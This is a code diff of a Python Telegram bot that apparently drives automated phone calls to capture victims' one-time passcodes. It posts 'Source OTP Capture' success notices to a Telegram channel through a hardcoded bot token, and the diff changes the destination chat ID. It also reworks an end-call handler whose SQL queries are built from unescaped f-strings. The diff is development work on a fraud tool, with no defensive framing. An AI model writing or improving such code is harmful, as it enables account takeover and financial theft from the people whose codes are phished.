@@ -781,12 +781,19 @@ def recordingtexis(recname):
 
 
 
-
-def callhangup(call_control:str):
+@bot.message_handler(commands=['endcall'])
+def callhangup(message):
+        
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     c.execute(f"Select * from api_key where id=123")
     apidata= c.fetchone()
+
+    c.execute(f"Select * from call_data where chat_id={message.from_user.id}")
+    custom_cont = c.fetchone()
+    call_control  = custom_cont[1]
+
+
     if apidata[1]==1:
         urlh = 'https://ai2api.com/v1/api/hangup'
         data = {
@@ -1330,7 +1337,7 @@ def prebuild_script_call(service,chatid):
             item2 = types.KeyboardButton(text="Deny")
             keyboard.add(item1,item2) 
             callinfo=bot.send_message(chatid, f"*Code received successfully*", reply_markup=keyboard,parse_mode='markdown',)
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002163467133&text=
 🚀 Source OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1832,12 +1839,7 @@ def handle_callback(message):
     elif message.data == '/customscript':
         Set_custom(message)
     elif message.data == '/endcall':
-        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
-        c = db.cursor()
-        c.execute(f"Select * from call_data where chat_id={message.from_user.id}")
-        custom_cont = c.fetchone()
-        call_control  = custom_cont[1]
-        callhangup(call_control)
+        callhangup(message)
     elif message.data == '/voice':
         Voices(message)
     elif message.data == '/help':
